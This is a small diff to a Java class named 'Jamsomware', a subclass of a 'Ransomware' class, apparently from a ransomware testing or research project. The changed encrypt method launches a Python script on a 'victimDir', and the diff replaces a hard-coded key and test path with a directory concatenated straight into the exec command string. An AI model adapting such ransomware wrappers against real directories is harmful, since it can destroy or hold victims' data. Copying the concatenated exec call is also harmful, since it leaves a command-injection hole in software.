@@ -9,7 +9,7 @@ public class Jamsomware extends Ransomware {
     @Override
     public void encrypt(String victimDir) throws Exception {
         System.out.println(victimDir);
-        Process p = Runtime.getRuntime().exec("python3 jamsomware.py --key clave --dir /home/gochi/Documentos/datos_prueba/test4");
+        Process p = Runtime.getRuntime().exec("python3 jamsomware.py --dir " + victimDir);
         p.waitFor();
     }
 
